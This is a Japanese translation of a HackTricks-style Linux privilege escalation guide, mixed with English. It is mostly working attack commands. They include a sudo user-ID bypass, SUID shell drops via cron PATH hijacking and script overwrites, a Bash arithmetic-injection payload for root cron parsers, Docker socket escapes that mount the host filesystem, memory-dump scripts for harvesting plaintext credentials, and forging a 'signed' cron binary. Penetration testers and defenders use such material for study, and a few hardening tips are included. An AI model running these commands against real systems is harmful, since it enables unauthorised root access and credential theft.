# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## システム情報

### OS 情報

実行中のOSに関する情報収集を始めましょう。
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### パス

**`PATH` 内の任意のフォルダに書き込み権限がある**場合、いくつかのライブラリやバイナリをハイジャックできる可能性があります:
```bash
echo $PATH
```
### 環境情報

環境変数に興味深い情報、パスワード、または API keys は含まれていますか？
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

kernel version を確認し、escalate privileges に使える exploit があるか確認する
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
脆弱なカーネルの良いリストと、既に **compiled exploits** が含まれているものはここで見つかります: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) and [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
他に **compiled exploits** を見つけられるサイト: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

そのウェブサイトからすべての脆弱なカーネルのバージョンを抽出するには、次のようにします:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
kernel exploits を検索するのに役立つツールは:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (victim 上で実行、kernel 2.x の exploit のみをチェックします)

Always **search the kernel version in Google**, maybe your kernel version is written in some kernel exploit and then you will be sure that this exploit is valid.

追加の kernel exploitation techniques:

{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo version

以下に示されている脆弱な sudo バージョンに基づく:
```bash
searchsploit sudo
```
この grep を使って sudo のバージョンが脆弱かどうかを確認できます。
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### Sudo < 1.9.17p1

1.9.17p1 より前の Sudo バージョン（**1.9.14 - 1.9.17 < 1.9.17p1**）では、ユーザーが制御するディレクトリから `/etc/nsswitch.conf` ファイルが使用されると、権限のないローカルユーザーが sudo の `--chroot` オプションを使って root に権限昇格できてしまいます。

その [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) はその [vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2025-32463) を exploit するためのものです。exploit を実行する前に、あなたの `sudo` バージョンが脆弱であり、`chroot` 機能をサポートしていることを確認してください。

For more information, refer to the original [vulnerability advisory](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)

#### sudo < v1.8.28

提供: @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg の署名検証に失敗しました

このvulnがどのように悪用されうるかの**例**については、**smasher2 box of HTB** を参照してください。
```bash
dmesg 2>/dev/null | grep "signature"
```
### さらなるシステム列挙
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## 可能な防御策を列挙する

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

もし docker container の中にいる場合は、そこから escape を試みることができます:

{{#ref}}
docker-security/
{{#endref}}

## ドライブ

**what is mounted and unmounted** がどこにマウントされ、なぜなのかを確認してください。何かが unmounted であれば、mount を試みて機密情報がないか確認してください。
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## 有用なソフトウェア

有用なバイナリを列挙する
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
また、**any compiler is installed**か確認してください。これは、kernel exploit を使用する必要がある場合に役立ちます。使用するマシン（または類似のマシン）でそれを compile することが推奨されます。
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### 脆弱なソフトウェアがインストールされている

インストールされているパッケージやサービスの**バージョンを確認**してください。例えば古い Nagios のバージョンなど、権限昇格に悪用される可能性のあるものがあるかもしれません…\
怪しいインストール済みソフトウェアについては手動でバージョンを確認することを推奨します。
```bash
dpkg -l #Debian
rpm -qa #Centos
```
もしマシンにSSHでアクセスできるなら、マシン内にインストールされている古いソフトウェアや脆弱なソフトウェアを確認するために **openVAS** を使用することもできます。

> [!NOTE] > _これらのコマンドはほとんど役に立たない多くの情報を表示することがあるため、インストールされているソフトウェアのバージョンが既知のエクスプロイトに対して脆弱かどうかをチェックする OpenVAS のようなアプリケーションを使うことを推奨します_

## Processes

どのような**プロセス**が実行されているかを確認し、どのプロセスが本来より**多くの権限を持っているか**をチェックしてください（たとえば root によって実行されている tomcat など）。
```bash
ps aux
ps -ef
top -n 1
```
常に [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](electron-cef-chromium-debugger-abuse.md) が実行されていないか確認してください。権限昇格に悪用される可能性があります。**Linpeas** はプロセスのコマンドライン内の `--inspect` パラメータを確認してそれらを検出します。\
また、プロセスのバイナリに対する自分の権限も必ず確認してください。上書きできるかもしれません。

### プロセス監視

プロセスを監視するために [**pspy**](https://github.com/DominicBreuker/pspy) のようなツールを使用できます。これは、頻繁に実行される、あるいは特定の条件が満たされたときに脆弱なプロセスを特定するのに非常に有用です。

### プロセスのメモリ

サーバの一部のサービスは **メモリ内に平文で保存された認証情報** を保持することがあります。\
通常、他ユーザーに属するプロセスのメモリを読むには **root privileges** が必要になるため、これは既に root の場合にさらに認証情報を発見するのに役立ちます。\
ただし、**通常ユーザーとして自分が所有するプロセスのメモリは読むことができる** ことを忘れないでください。

> [!WARNING]
> 現在、多くのマシンではデフォルトで **ptrace を許可していない** ことに注意してください。これは、権限のないユーザーに属する他のプロセスをダンプできないことを意味します。
>
> ファイル _**/proc/sys/kernel/yama/ptrace_scope**_ が ptrace のアクセス権を制御します:
>
> - **kernel.yama.ptrace_scope = 0**: 同じ uid であればすべてのプロセスをデバッグできます。これは従来の ptrace の動作方法です。
> - **kernel.yama.ptrace_scope = 1**: デバッグできるのは親プロセスのみです。
> - **kernel.yama.ptrace_scope = 2**: CAP_SYS_PTRACE 権限が必要となり、管理者のみが ptrace を使用できます。
> - **kernel.yama.ptrace_scope = 3**: ptrace でトレースできるプロセスはありません。一度設定すると、ptrace を再度有効にするには再起動が必要です。

#### GDB

FTP サービス（例えば）のメモリにアクセスできる場合、Heap を取得してその中の認証情報を検索できます。
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB Script
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

特定のプロセスIDに対して、**maps はそのプロセスの仮想アドレス空間内でメモリがどのようにマッピングされているかを示し**、また **各マッピング領域のアクセス権限を示します**。**mem** 疑似ファイルは **プロセスのメモリ自体を露出します**。**maps** ファイルから、どの **メモリ領域が読み取り可能か** とそのオフセットがわかります。この情報を使って、**mem ファイル内をシークし、読み取り可能な領域をすべてダンプする** ことでファイルに書き出します。
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` はシステムの **物理** メモリにアクセスを提供し、仮想メモリではありません。カーネルの仮想アドレス空間には `/dev/kmem` を使用してアクセスできます.\  
通常、`/dev/mem` は **root** および **kmem** グループのみが読み取り可能です。
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump for linux

ProcDumpは、Windows向けのSysinternalsツールスイートにあるクラシックなProcDumpツールをLinux向けに再構築したものです。入手先: [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### ツール

process memoryをdumpするには、次のものを使用できます:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_手動でroot要件を削除し、あなたが所有するprocessをdumpできます
- Script A.5 from [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root が必要)

### Process MemoryからのCredentials

#### 手動の例

authenticator processが実行されている場合:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
プロセスを dump して（前のセクションを参照して、プロセスのメモリを dump するさまざまな方法を確認してください）メモリ内で credentials を検索できます:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

ツール [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) は、**steal clear text credentials from memory** およびいくつかの **well known files** から情報を盗みます。正常に動作させるには root 権限が必要です。

| 機能                                           | プロセス名             |
| ------------------------------------------------- | -------------------- |
| GDM password (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Active FTP Connections)                   | vsftpd               |
| Apache2 (Active HTTP Basic Auth Sessions)         | apache2              |
| OpenSSH (Active SSH Sessions - Sudo Usage)        | sshd:                |

#### 検索用正規表現/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## スケジュール/Cron ジョブ

### Crontab UI (alseambusher) が root で動作している場合 – web ベースのスケジューラ privesc

web “Crontab UI” パネル (alseambusher/crontab-ui) が root として動作し、ループバックにのみバインドされている場合でも、SSH のローカルポートフォワーディング経由で到達し、特権ジョブを作成して権限を昇格させることができます。

典型的な手順
- `ss -ntlp` / `curl -v localhost:8000` を使って、ループバック専用ポート（例: 127.0.0.1:8000）と Basic-Auth realm を発見する
- 運用アーティファクトから認証情報を見つける:
  - バックアップ/スクリプト (`zip -P <password>`)
  - systemd ユニットが `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."` を露出している
- ポートフォワードしてログイン:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- 高権限のジョブを作成してすぐに実行する（SUID shellをドロップする）：
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- 使用する:
```bash
/tmp/rootshell -p   # root shell
```
Hardening
- Crontab UIをrootで実行しない。専用ユーザーと最小権限で制限する
- localhostにバインドし、さらにファイアウォール/VPNでアクセスを制限する。パスワードを再利用しない
- unitファイルにシークレットを埋め込まない。secret storesまたはroot専用のEnvironmentFileを使用する
- on-demand jobの実行に対して監査/ログを有効にする

スケジュールされたジョブが脆弱かどうか確認する。rootによって実行されるスクリプトを悪用できるかもしれない（wildcard vuln? rootが使うファイルを変更できるか? symlinksを使う? rootが使うディレクトリに特定のファイルを作成する?）。
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron パス

例えば、_/etc/crontab_ の中では次のように PATH が定義されています: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_user が /home/user に書き込み権限を持っている点に注意_)

この crontab 内で root が PATH を設定せずにコマンドやスクリプトを実行しようとする場合。例えば: _\* \* \* \* root overwrite.sh_\  
その場合、次のようにして root シェルを取得できます:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron がワイルドカードを含むスクリプトを実行する場合 (Wildcard Injection)

スクリプトが root によって実行され、コマンド内に “**\***” が含まれている場合、これを利用して予期しない動作（privesc のような）を引き起こすことができます。例：
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**ワイルドカードがパス（例：** _**/some/path/\***_ **）の前に付いている場合は、脆弱ではありません（** _**./\***_ **も同様です）。**

次のページを参照して、ワイルドカードの悪用トリックをさらに確認してください：


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash の算術展開注入（cron ログパーサ）

Bash は ((...)), $((...)) および let の中で算術評価の前に parameter expansion と command substitution を実行します。root の cron/parser が信頼できないログフィールドを読み取り、それを算術コンテキストに渡すと、攻撃者はコマンド置換 $(...) を注入でき、cron 実行時に root として実行されます。

- なぜ動作するか: Bash では展開が次の順番で行われます: parameter/variable expansion, command substitution, arithmetic expansion, その後に word splitting と pathname expansion が行われます。したがって `$(/bin/bash -c 'id > /tmp/pwn')0` のような値はまず置換され（コマンドが実行され）、残った数値の `0` が算術に使われるためスクリプトはエラーなく続行します。

- 典型的な脆弱パターン:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- 悪用方法: 攻撃者が制御するテキストを解析されるログに書き込み、数値に見えるフィールドの中にコマンド置換を含めて末尾を数字にしてください。算術が有効なままであるように、コマンドは stdout に出力しない（または出力をリダイレクトする）ようにします。
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron スクリプトの上書きと symlink
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
rootによって実行されるscriptが**directory where you have full access**を使用している場合、そのフォルダを削除して、あなたが制御するscriptを提供する別の場所への**create a symlink folder to another one**を作成するのが有用かもしれません。
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### カスタム署名された cron バイナリと書き込み可能なペイロード
Blue teams は、root として実行する前にカスタムの ELF セクションをダンプしてベンダー文字列を grep することで、cron 駆動のバイナリに 'sign' を行うことがあります。もしそのバイナリが group-writable（例: `/opt/AV/periodic-checks/monitor` が `root:devs 770`）で、signing material を leak できるなら、そのセクションを偽造して cron タスクをハイジャックできます:

1. 検証フローをキャプチャするために `pspy` を使用します。Era では、root が `objcopy --dump-section .text_sig=text_sig_section.bin monitor` を実行し、その後 `grep -oP '(?<=UTF8STRING        :)Era Inc.' text_sig_section.bin` を実行してからファイルを実行していました。
2. leaked key/config（`signing.zip` から）を使って期待される証明書を再作成します:
```bash
openssl req -x509 -new -nodes -key key.pem -config x509.genkey -days 365 -out cert.pem
```
3. 悪意のある置換バイナリを作成（例: drop a SUID bash, add your SSH key）し、証明書を `.text_sig` に埋め込んで grep が通るようにします:
```bash
gcc -fPIC -pie monitor.c -o monitor
objcopy --add-section .text_sig=cert.pem monitor
objcopy --dump-section .text_sig=text_sig_section.bin monitor
strings text_sig_section.bin | grep 'Era Inc.'
```
4. 実行ビットを保持したままスケジュールされたバイナリを上書きします:
```bash
cp monitor /opt/AV/periodic-checks/monitor
chmod 770 /opt/AV/periodic-checks/monitor
```
5. 次の cron 実行を待ちます。単純な署名チェックが通ると、あなたのペイロードが root として実行されます。

### 頻繁な cron ジョブ

プロセスを監視して、1分、2分、5分ごとに実行されているプロセスを探すことができます。これを利用して権限を昇格できるかもしれません。

例えば、**0.1秒ごとに1分間監視**し、**実行回数の少ないコマンド順にソート**して最も多く実行されたコマンドを削除するには、次のようにします:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**また使用できます** [**pspy**](https://github.com/DominicBreuker/pspy/releases)（これは起動するすべてのプロセスを監視して一覧表示します）。

### 見えない cron jobs

コメントの後に改行文字を入れずにキャリッジリターンを置くことで cronjob を作成でき、cron job は動作します。例（キャリッジリターン文字に注意）:
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## サービス

### 書き込み可能な _.service_ ファイル

任意の `.service` ファイルに書き込みできるか確認してください。可能であれば、それを **変更する**ことで、サービスが **開始（started）**、**再起動（restarted）**、または **停止（stopped）** したときにあなたの **backdoor** を **実行** させることができます（場合によってはマシンの再起動を待つ必要があります）。\  
例えば `.service` ファイル内にあなたの backdoor を作成し、**`ExecStart=/tmp/script.sh`** を指定します。

### 書き込み可能なサービスバイナリ

サービスによって実行される**binaries に対する write permissions**を持っている場合、それらを backdoors に変更することで、サービスが再実行されたときに backdoors が実行されます。

### systemd PATH - 相対パス

次のコマンドで **systemd** が使用する PATH を確認できます:
```bash
systemctl show-environment
```
パス内の任意のフォルダに**書き込み**できることが分かった場合、**権限昇格**が可能な場合があります。次のようなサービス設定ファイルで**相対パスが使用されている**箇所を検索する必要があります：
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Then, create an **executable** with the **same name as the relative path binary** inside the systemd PATH folder you can write, and when the service is asked to execute the vulnerable action (**Start**, **Stop**, **Reload**), your **backdoor will be executed** (unprivileged users usually cannot start/stop services but check if you can use `sudo -l`).

**Learn more about services with `man systemd.service`.**

## **タイマー**

**タイマー**は名前が `**.timer**` で終わる systemd ユニットファイルで、`**.service**` ファイルやイベントを制御します。**タイマー**はカレンダー時刻イベントや単調時間イベントをネイティブにサポートし、非同期で実行できるため、cron の代替として利用できます。

You can enumerate all the timers with:
```bash
systemctl list-timers --all
```
### Writable timers

タイマーを変更できる場合、systemd.unit の既存ユニット（例えば `.service` や `.target`）を実行させることができます。
```bash
Unit=backdoor.service
```
In the documentation you can read what the Unit is:

> このタイマーが満了したときにアクティブ化される unit。引数はサフィックスが ".timer" ではない unit name です。指定しない場合、この値はタイマー unit と同じ名前（サフィックスを除く）を持つ service にデフォルトされます（上参照）。アクティブ化される unit name とタイマー unit の unit name は、サフィックスを除いて同一にすることが推奨されます。

Therefore, to abuse this permission you would need to:

- **書き込み可能なバイナリを実行している** systemd unit（例: `.service`）を見つける
- 相対パスを**実行している** systemd unit を見つけ、さらにその実行ファイルを偽装するために **systemd PATH** に対して **書き込み権限** を持っていることを確認する

**Learn more about timers with `man systemd.timer`.**

### **タイマーの有効化**

タイマーを有効化するには root 権限が必要で、以下を実行します:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
注意：**timer** は `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer` にシンボリックリンクを作成することで**有効化**されます

## ソケット

Unix Domain Sockets (UDS) は、クライアント-サーバモデル内で同一または異なるマシン間の**プロセス間通信**を可能にします。標準の Unix ディスクリプタファイルを利用してコンピュータ間の通信を行い、`.socket` ファイルを通じて設定されます。

Sockets can be configured using `.socket` files.

**Learn more about sockets with `man systemd.socket`.** Inside this file, several interesting parameters can be configured:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: これらのオプションは異なる動作をしますが、要約するとソケットがどこで待ち受けるか（AF_UNIX ソケットファイルのパス、待ち受ける IPv4/6 および/またはポート番号など）を**指定します**。
- `Accept`: ブール引数を取ります。**true** の場合、受信ごとに**サービスインスタンスが生成され**、接続ソケットのみがそのインスタンスに渡されます。**false** の場合、すべてのリッスンソケット自体が起動される service unit に渡され、すべての接続に対して1つの service unit だけが生成されます。データグラムソケットや FIFO では、この値は無視され、単一の service unit が全ての受信トラフィックを無条件に処理します。**デフォルトは false**です。パフォーマンス上の理由から、新しいデーモンは `Accept=no` に適した方法でのみ書くことが推奨されます。
- `ExecStartPre`, `ExecStartPost`: 1つ以上のコマンドラインを取り、リッスンする**ソケット**/FIFO がそれぞれ**作成およびバインドされる前**または**後**に実行されます。コマンドラインの最初のトークンは絶対ファイル名である必要があり、その後にプロセスの引数が続きます。
- `ExecStopPre`, `ExecStopPost`: リッスンする**ソケット**/FIFO がそれぞれ**閉じられ削除される前**または**後**に実行される追加の**コマンド**です。
- `Service`: 受信トラフィック時に**起動する** **service** ユニット名を指定します。この設定は Accept=no のソケットでのみ許可されます。デフォルトはソケットと同名（サフィックスを置換したもの）のサービスです。ほとんどの場合、このオプションを使う必要はありません。

### Writable .socket files

If you find a **writable** `.socket` file you can **add** at the beginning of the `[Socket]` section something like: `ExecStartPre=/home/kali/sys/backdoor` and the backdoor will be executed before the socket is created. Therefore, you will **probably need to wait until the machine is rebooted.**\
_Note that the system must be using that socket file configuration or the backdoor won't be executed_

### 書き込み可能なソケット

If you **identify any writable socket** (_now we are talking about Unix Sockets and not about the config `.socket` files_), then **you can communicate** with that socket and maybe exploit a vulnerability.

### Unix ソケットの列挙
```bash
netstat -a -p --unix
```
### Raw 接続
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**悪用例:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

一部に **sockets listening for HTTP** requests があるかもしれない点に注意してください（_ここで言っているのは .socket files ではなく、unix sockets として動作するファイルのことです_）。次のコマンドで確認できます:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
If the socket **HTTPで応答する**場合、**通信**でき、場合によっては**exploit**して脆弱性を突けるかもしれません。

### 書き込み可能な Docker ソケット

Docker ソケット（多くの場合 `/var/run/docker.sock` にあります）は、保護すべき重要なファイルです。デフォルトでは、`root` ユーザーと `docker` グループのメンバーが書き込み可能です。 このソケットへの書き込みアクセスは privilege escalation を引き起こす可能性があります。以下では、これを行う方法と、Docker CLI が利用できない場合の代替手段を説明します。

#### **Privilege Escalation with Docker CLI**

Docker ソケットへの書き込みアクセス権がある場合、次のコマンドを使用して escalate privileges できます：
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
These commands allow you to run a container with root-level access to the host's file system.

#### **Using Docker API Directly**

In cases where the Docker CLI isn't available, the Docker socket can still be manipulated using the Docker API and `curl` commands.

1.  **List Docker Images:** 利用可能なイメージの一覧を取得します。

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** ホストのルートディレクトリをマウントするコンテナを作成するリクエストを送信します。

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Start the newly created container:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** `socat` を使ってコンテナへの接続を確立し、コンテナ内でコマンドを実行できるようにします。

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

socat接続を設定した後、ホストのファイルシステムに対してroot権限でコンテナ内から直接コマンドを実行できます。

### その他

docker socket に対する書き込み権限がある（**inside the group `docker`** の場合）は、[**more ways to escalate privileges**](interesting-groups-linux-pe/index.html#docker-group)があります。もし [**docker API is listening in a port** you can also be able to compromise it](../../network-services-pentesting/2375-pentesting-docker.md#compromising) なら、その経路を介して侵害できる可能性もあります。

Check **more ways to break out from docker or abuse it to escalate privileges** in:


{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) privilege escalation

もし **`ctr`** コマンドを使えることがわかったら、次のページを読んでください（**you may be able to abuse it to escalate privileges**）:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

もし **`runc`** コマンドを使えることがわかったら、次のページを読んでください（**you may be able to abuse it to escalate privileges**）:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus は高度な inter-Process Communication (IPC) システムで、アプリケーションが効率的に相互作用しデータを共有することを可能にします。モダンな Linux システムを念頭に設計されており、さまざまな形態のアプリケーション間通信のための堅牢なフレームワークを提供します。

このシステムは汎用性が高く、プロセス間のデータ交換を強化する基本的な IPC をサポートしており、**enhanced UNIX domain sockets** を思わせる仕組みを持ちます。さらに、イベントやシグナルのブロードキャストを助け、システムコンポーネント間のシームレスな統合を促進します。たとえば、Bluetooth デーモンからの着信通知のシグナルが音楽プレーヤーをミュートするよう促すことで、ユーザ体験が向上します。加えて、D-Bus はリモートオブジェクトシステムをサポートしており、アプリケーション間のサービス要求やメソッド呼び出しを簡素化し、従来は複雑だった処理を効率化します。

D-Bus は **allow/deny model** に基づいて動作し、ポリシールールのマッチングの累積効果に基づいてメッセージの権限（メソッド呼び出し、シグナル送出など）を管理します。これらのポリシーは bus とのやり取りを指定し、権限の悪用を通じて privilege escalation を許す可能性があります。

例として /etc/dbus-1/system.d/wpa_supplicant.conf にあるそのようなポリシーが示されており、root ユーザーが `fi.w1.wpa_supplicant1` を所有し、送信し、受信する権限を持つことが詳細に記述されています。

